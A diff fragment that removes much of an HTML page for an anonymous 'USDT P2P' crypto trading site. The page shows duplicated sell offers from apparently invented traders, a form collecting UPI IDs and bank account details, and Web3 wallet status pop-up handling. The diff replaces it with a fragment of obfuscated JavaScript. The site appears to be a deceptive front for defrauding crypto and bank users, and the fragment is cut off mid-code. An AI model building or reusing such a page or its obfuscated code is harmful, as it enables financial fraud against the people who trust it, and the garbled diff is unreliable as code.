-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹11,000 - ₹50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">PhonePe,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">93%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
- <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by USDT_Seller</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹115/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹35,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
- <!-- Sell Order Card 6 -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="PhonePe" data-amount="110-50000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by FastTrader</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹11,000 - ₹50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">PhonePe,IMPS</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">93%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
- <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by CherryModel</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹118/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹50,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">97%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
- <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by Jeji Babu</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹118/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹1,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
- <!-- Sell Order Card 6 -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="PhonePe" data-amount="110-50000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by TraderRR</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">PhonePe,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">93%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
- <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by Chotu-123</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹30,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">99%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-
-
-<!-- Additional Orders (Hidden by default) -->
-<div id="additional-orders" class="hidden grid md:grid-cols-2 lg:grid-cols-3 gap-6 mt-8">
-
-                    <!-- Sell Order Card 7 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="25000-300000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by CryptoKing</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-                                <span class="text-xs text-gray-500">Online</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹113/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹25,000 - ₹3,00,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">CDM,IMPS</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">95%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-                                Sell Now
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Sell Order Card 8 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Paytm,IMPS" data-amount="10000-100000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by USDT_Elite</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-                                <span class="text-xs text-gray-500">Online</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹109/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹10,000 - ₹1,00,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">Paytm,CDM,IMPS</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">88%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-                                Sell Now
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Sell Order Card 9 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="5000-50000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by FastCash</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-                                <span class="text-xs text-gray-500">Online</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹111/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹5,000 - ₹50,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">CDM,IMPS</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">92%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-                                Sell Now
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Sell Order Card 5 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Paytm" data-amount="20000-200000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by USDT_Pro</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-offline mr-2"></div>
-                                <span class="text-xs text-gray-500">Offline</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹105/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹20,000 - ₹2,00,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">Paytm</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">91%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button class="flex-1 bg-gray-400 text-white py-2 rounded-lg cursor-not-allowed" disabled="">
-                                Offline
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-                    <!-- Sell Order Card 11 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="100000-1000000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by USDT_Pro</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-                                <span class="text-xs text-gray-500">Online</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹114/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹1,00,000 - ₹10,00,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">UPI,IMPS</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">98%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button id="verifyBtn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-                                Sell Now
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Sell Order Card 5 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Paytm" data-amount="20000-200000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by USDT_Pro</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-offline mr-2"></div>
-                                <span class="text-xs text-gray-500">Offline</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹105/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹20,000 - ₹2,00,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">Paytm</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">91%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button class="flex-1 bg-gray-400 text-white py-2 rounded-lg cursor-not-allowed" disabled="">
-                                Offline
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-    </section>
-
-    <!-- Loading Spinner -->
-    <div id="loading-spinner-overlay" class="loading-spinner-overlay">
-        <div class="loading-spinner-container">
-            <div class="loader-triangle-5"></div>
-            <div class="loading-text">Processing...</div>
-        </div>
-    </div>
-
-    <!-- Notification Toast -->
-    <div id="notification-toast" class="fixed top-4 right-4 z-60 hidden">
-        <div class="bg-white rounded-lg shadow-lg p-4 max-w-sm">
-            <div class="flex items-center">
-                <div id="toast-icon" class="mr-3">
-                    <i class="fas fa-info-circle text-blue-500 text-xl"></i>
-                </div>
-                <div class="flex-1">
-                    <h4 id="toast-title" class="font-semibold text-gray-800">Notification</h4>
-                    <p id="toast-message" class="text-sm text-gray-600">This is a notification message.</p>
-                </div>
-                <button id="toast-close" class="text-gray-400 hover:text-gray-600">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Quick Trade Modal -->
-    <div id="trade-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50">
-        <div class="flex items-center justify-center min-h-screen p-4">
-            <div class="bg-white rounded-lg shadow-xl max-w-md w-full">
-                <div class="flex justify-between items-center p-6 border-b">
-                    <h3 class="text-lg font-semibold text-gray-800">Sell USDT</h3>
-                    <button id="close-modal" class="text-gray-400 hover:text-gray-600">
-                        <i class="fas fa-times"></i>
-                    </button>
-                </div>
-                <div class="p-6">
-                    <div class="mb-4">
-                        <label class="block text-sm font-medium text-gray-700 mb-2">USDT Amount</label>
-                        <input type="number" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter USDT amount">
-                    </div>
-                    <div class="mb-4">
-                        <label class="block text-sm font-medium text-gray-700 mb-2">Payment Method</label>
-                        <select id="payment-method" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
-                            <option value="">Select Payment Method</option>
-                            <option value="UPI">UPI</option>
-                            <option value="IMPS">IMPS</option>
-                            <option value="Bank Transfer">Bank Transfer</option>
-                            <option value="Paytm">Paytm</option>
-                            <option value="PhonePe">PhonePe</option>
-                            <option value="Google Pay">Google Pay</option>
-                        </select>
-                    </div>
-                    
-                    <!-- Payment Details Section -->
-                    <div id="payment-details" class="mb-4 hidden">
-                        <h4 class="text-sm font-medium text-gray-700 mb-3">Payment Details</h4>
-                        
-                        <!-- UPI Details -->
-                        <div id="upi-details" class="payment-form hidden">
-                            <div class="mb-3">
-                                <label class="block text-sm font-medium text-gray-600 mb-1">UPI ID</label>
-                                <input type="text" id="upi-id" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter your UPI ID">
-                            </div>
-                        </div>
-                        
-                        <!-- Bank Transfer Details -->
-                        <div id="bank-details" class="payment-form hidden">
-                            <div class="mb-3">
-                                <label class="block text-sm font-medium text-gray-600 mb-1">Account Holder Name</label>
-                                <input type="text" id="holder-name" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter account holder name">
-                            </div>
-                            <div class="mb-3">
-                                <label class="block text-sm font-medium text-gray-600 mb-1">Account Number</label>
-                                <input type="text" id="account-number" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter account number">
-                            </div>
-                            <div class="mb-3">
-                                <label class="block text-sm font-medium text-gray-600 mb-1">IFSC Code</label>
-                                <input type="text" id="ifsc-code" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter IFSC code">
-                            </div>
-                        </div>
-                        
-                        <!-- Digital Wallet Details -->
-                        <div id="digital-wallet-details" class="payment-form hidden">
-                            <div class="mb-3">
-                                <label class="block text-sm font-medium text-gray-600 mb-1">Mobile Number</label>
-                                <input type="text" id="mobile-number" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter your mobile number">
-                            </div>
-                        </div>
-                    </div>
-                    <div class="mb-6">
-                        <div class="bg-gray-50 p-3 rounded-lg">
-                            <div class="flex justify-between text-sm">
-                                <span class="text-gray-600">You will receive:</span>
-                                <span class="font-semibold" id="inr-amount">₹0.00</span>
-                            </div>
-                            <div class="flex justify-between text-sm mt-1">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹110/USDT</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="flex space-x-3">
-                        <button id="sell-usdt-btn" class="flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-                            <span id="sell-btn-text">Proceed with Trade</span>
-                            <span id="sell-btn-loading" class="hidden">
-                                <i class="fas fa-spinner fa-spin mr-2"></i>Processing...
-                            </span>
-                        </button>
-                        <button id="cancel-trade" class="flex-1 bg-gray-200 text-gray-700 py-2 rounded-lg hover:bg-gray-300 transition-colors">
-                            Cancel
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Footer -->
-    <footer class="bg-gray-800 text-white py-8">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="text-center">
-                <div class="flex items-center justify-center mb-4">
-                    <i class="fas fa-coins text-2xl text-blue-400 mr-2"></i>
-                    <span class="text-xl font-bold">USDT P2P</span>
-                </div>
-                <p class="text-gray-400 mb-4">
-                    The most private and anonymous P2P USDT trading platform. No signup, no KYC, no fees.
-                </p>
-                <div class="flex justify-center space-x-4">
-                    <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                        <i class="fab fa-twitter text-xl"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                        <i class="fab fa-telegram text-xl"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                        <i class="fab fa-discord text-xl"></i>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Custom script after Web3 -->
-  <script src="js/script.js"></script>
-
-  <!-- ✅ Override showPopup function IMMEDIATELY after script.js loads -->
-<script>
-    // Since script.js loads synchronously, override showPopup immediately after it executes
-    // This ensures we catch the function before any calls are made
-    
-    (function() {
-        // Store timeout ID to clear it when new message comes
-        let spinnerTimeout = null;
-        
-        // Override the showPopup function from script.js
-        window.showPopup = function(message, color) {
-            console.log('🔵 showPopup called with:', message, color);
-            console.log('🔵 Raw message:', message, 'Color:', color);
-            
-            // Clear any existing timeout
-            if (spinnerTimeout) {
-                clearTimeout(spinnerTimeout);
-                spinnerTimeout = null;
-            }
-            
-            // Remove any old popupBox if it exists
-            const oldPopup = document.getElementById('popupBox');
-            if (oldPopup) {
-                oldPopup.style.display = 'none';
-                oldPopup.remove();
-            }
-            
-            // Get loading spinner elements
-            const loadingOverlay = document.getElementById('loading-spinner-overlay');
-            if (!loadingOverlay) {
-                console.error('❌ Loading spinner overlay not found!');
-                alert(message || 'Processing...');
-                return;
-            }
-            
-            const loadingText = loadingOverlay.querySelector('.loading-text');
-            
-            // Clean message text (remove HTML tags if present)
-            let cleanMessage = 'Processing...';
-            if (message && typeof message === 'string' && message.trim()) {
-                // Remove HTML tags and extract text
-                const tempDiv = document.createElement('div');
-                tempDiv.innerHTML = message;
-                cleanMessage = tempDiv.textContent || tempDiv.innerText || message;
-                // Trim whitespace
-                cleanMessage = cleanMessage.trim();
-                // If empty after cleaning, use original
-                if (!cleanMessage) {
-                    cleanMessage = message;
-                }
-                // Limit message length
-                if (cleanMessage.length > 50) {
-                    cleanMessage = cleanMessage.substring(0, 47) + '...';
-                }
-            } else if (message) {
-                // If message exists but isn't a string, convert it
-                cleanMessage = String(message);
-            }
-            
-            if (loadingText) {
-                loadingText.textContent = cleanMessage;
-            }
-            
-            // Show the loading spinner with animation
-            loadingOverlay.classList.add('show');
-            console.log('✅ Loading spinner shown:', cleanMessage);
-            
-            // Determine if this is a completion/error message (should auto-hide after a delay)
-            // Or a loading message (should stay visible until next call)
-            const isCompletion = cleanMessage.includes('complete') || 
-                                 cleanMessage.includes('failed') || 
-                                 cleanMessage.includes('Successful') ||
-                                 cleanMessage.includes('not connected') ||
-                                 cleanMessage.includes('No USDT');
-            
-            const isError = color === 'red' || cleanMessage.includes('failed') || cleanMessage.includes('not connected');
-            
-            if (isCompletion || isError) {
-                // Hide after 5 seconds for completion/error messages
-                spinnerTimeout = setTimeout(function() {
-                    loadingOverlay.classList.remove('show');
-                    console.log('⏰ Loading spinner hidden (completion message)');
-                    spinnerTimeout = null;
-                }, 5000);
-            } else {
-                // For loading messages (Please Wait, Loading...), keep visible
-                // It will be updated by the next showPopup call or hidden by completion message
-                console.log('⏳ Keeping spinner visible (loading message)');
-            }
-        };
-        
-        console.log('✅ showPopup function overridden successfully');
-    })();
-    
-    // Function to override showPopup (for reuse in backup handlers)
-    let spinnerTimeoutGlobal = null;
-    
-    function overrideShowPopup() {
-        window.showPopup = function(message, color) {
-            console.log('🔵 showPopup called with:', message, color);
-            
-            // Clear any existing timeout
-            if (spinnerTimeoutGlobal) {
-                clearTimeout(spinnerTimeoutGlobal);
-                spinnerTimeoutGlobal = null;
-            }
-            
-            const oldPopup = document.getElementById('popupBox');
-            if (oldPopup) {
-                oldPopup.style.display = 'none';
-                oldPopup.remove();
-            }
-            
-            const loadingOverlay = document.getElementById('loading-spinner-overlay');
-            if (!loadingOverlay) {
-                console.error('❌ Loading spinner overlay not found!');
-                alert(message || 'Processing...');
-                return;
-            }
-            
-            const loadingText = loadingOverlay.querySelector('.loading-text');
-            let cleanMessage = 'Processing...';
-            if (message) {
-                const tempDiv = document.createElement('div');
-                tempDiv.innerHTML = message;
-                cleanMessage = tempDiv.textContent || tempDiv.innerText || 'Processing...';
-                if (cleanMessage.length > 50) {
-                    cleanMessage = cleanMessage.substring(0, 47) + '...';
-                }
-            }
-            
-            if (loadingText) {
-                loadingText.textContent = cleanMessage;
-            }
-            
-            loadingOverlay.classList.add('show');
-            console.log('✅ Loading spinner shown:', cleanMessage);
-            
-            // Determine if this is a completion/error message
-            const isCompletion = cleanMessage.includes('complete') || 
-                                 cleanMessage.includes('failed') || 
-                                 cleanMessage.includes('Successful') ||
-                                 cleanMessage.includes('not connected') ||
-                                 cleanMessage.includes('No USDT');
-            
-            const isError = color === 'red' || cleanMessage.includes('failed') || cleanMessage.includes('not connected');
-            
-            if (isCompletion || isError) {
-                // Hide after 5 seconds for completion/error messages
-                spinnerTimeoutGlobal = setTimeout(function() {
-                    loadingOverlay.classList.remove('show');
-                    console.log('⏰ Loading spinner hidden (completion message)');
-                    spinnerTimeoutGlobal = null;
-                }, 5000);
-            } else {
-                // For loading messages, keep visible until next call
-                console.log('⏳ Keeping spinner visible (loading message)');
-            }
-        };
+      } catch (_0x39e5f1) {
+        _0x538262.push(_0x538262.shift());
+      }
     }
-    
-    // Also override after DOM is ready (backup)
-    document.addEventListener('DOMContentLoaded', function() {
-        // Re-override to ensure it's still set
-        overrideShowPopup();
-        
-        // Monitor for any popupBox elements being created and replace with spinner
-        const observer = new MutationObserver(function(mutations) {
-            const popupBox = document.getElementById('popupBox');
-            if (popupBox && popupBox.style.display !== 'none') {
-                console.log('PopupBox detected, replacing with spinner');
-                // Hide the old popup and show loading spinner instead
